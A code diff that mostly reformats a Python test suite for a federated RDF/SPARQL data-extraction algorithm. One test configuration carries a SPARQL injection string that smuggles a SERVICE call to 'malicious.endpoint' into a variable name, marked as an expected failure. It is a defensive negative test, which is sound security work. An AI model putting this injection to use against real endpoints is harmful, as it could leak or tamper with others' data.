@@ -112,7 +112,7 @@ def test_configurations(rdf_store):
                 },
                 "ncit:C156420": {
                     "datatype": "numerical",
-                }
+                },
             },
             "query_type": "single_column",
         },
@@ -120,9 +120,7 @@ def test_configurations(rdf_store):
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
             "variables_to_extract": {
                 "<http://example.org/predicate> UNION { SERVICE <http://malicious.endpoint/sparql> "
-                "{ SELECT ?data WHERE { ?s ?p ?data } } }": {
-                    "datatype": "categorical"
-                },
+                "{ SELECT ?data WHERE { ?s ?p ?data } } }": {"datatype": "categorical"},
             },
             "query_type": "single_column",
             "expected_failure": True,
@@ -132,12 +130,8 @@ def test_configurations(rdf_store):
         "standard_dataset_incorrect_input": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
             "variables_to_extract": {
-                "Variable_1": {
-                    "datatype": "categorical"
-                },
-                "ncit:C-does-not-exist": {
-                    "datatype": "numerical"
-                },
+                "Variable_1": {"datatype": "categorical"},
+                "ncit:C-does-not-exist": {"datatype": "numerical"},
             },  # Use a non-existent variable
             "query_type": "single_column",
             "expected_failure": True,
@@ -147,9 +141,7 @@ def test_configurations(rdf_store):
         "standard_dataset_missing_variable_input": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
             "variables_to_extract": {
-                "ncit:C0123456789": {
-                    "datatype": "categorical"
-                },
+                "ncit:C0123456789": {"datatype": "categorical"},
             },  # Use a non-existent variable
             "query_type": "single_column",
         },
@@ -161,7 +153,7 @@ def test_configurations(rdf_store):
                 },
                 "ncit:C156420": {
                     "datatype": "numerical",
-                }
+                },
             },
             "query_type": "single_column",
             "expected_failure": True,
@@ -225,13 +217,13 @@ class TestAlgorithmComponent:
         ],
     )
     def test_algorithm_basic(
-            self,
-            authentication,
-            algorithm_image_name,
-            test_configurations,
-            test_methods,
-            method,
-            config_name,
+        self,
+        authentication,
+        algorithm_image_name,
+        test_configurations,
+        test_methods,
+        method,
+        config_name,
     ):
         """
         Test algorithm with different methods and configurations, including expected failures.
@@ -377,7 +369,7 @@ def extract_data_from_result(client, task) -> List[pd.DataFrame]:
 
 
 def determine_result_acceptance(
-        federated_result: List[pd.DataFrame], algorithm_kwargs: Dict[str, Any] = None
+    federated_result: List[pd.DataFrame], algorithm_kwargs: Dict[str, Any] | None = None
 ) -> bool:
     """
     Validate that federated RDF extraction results meet expected criteria.
@@ -398,6 +390,9 @@ def determine_result_acceptance(
         print("Validation failed: Result is None")
         return False
 
+    if algorithm_kwargs is None:
+        algorithm_kwargs = {}
+
     query_type = algorithm_kwargs.get("query_type")
     if query_type == "single_column":
         # Load expected data from CSV file
@@ -406,7 +401,7 @@ def determine_result_acceptance(
             df = pd.read_csv(csv_path)
             df["patient_id"] = range(len(df))
             df = df.map(lambda x: x if not isinstance(x, (int, float)) else str(x))
-            expected_data = [df.to_json(orient='columns')]
+            expected_data = [df.to_json(orient="columns")]
         else:
             raise FileNotFoundError(f"Expected data file not found: {csv_path}")
 
@@ -421,10 +416,8 @@ def determine_result_acceptance(
             result_dataframes = [federated_result]
 
         if algorithm_kwargs.get("variables_to_extract") == {
-                "ncit:C0123456789": {
-                    "datatype": "categorical"
-                },
-            }:
+            "ncit:C0123456789": {"datatype": "categorical"},
+        }:
             for df in result_dataframes:
                 assert (
                     df.empty
@@ -446,7 +439,7 @@ def determine_result_acceptance(
 
         # Validate each DataFrame
         for i, (result_df, expected_df) in enumerate(
-                zip(result_dataframes, expected_dataframes)
+            zip(result_dataframes, expected_dataframes)
         ):
             if not isinstance(result_df, pd.DataFrame):
                 print(f"Validation failed: Result {i} is not a DataFrame")
@@ -467,8 +460,8 @@ def determine_result_acceptance(
 
             # Check a sample of data values for key columns
             if (
-                    "patient_id" in result_df.columns
-                    and "patient_id" in expected_df.columns
+                "patient_id" in result_df.columns
+                and "patient_id" in expected_df.columns
             ):
                 if not result_df["patient_id"].equals(expected_df["patient_id"]):
                     print(
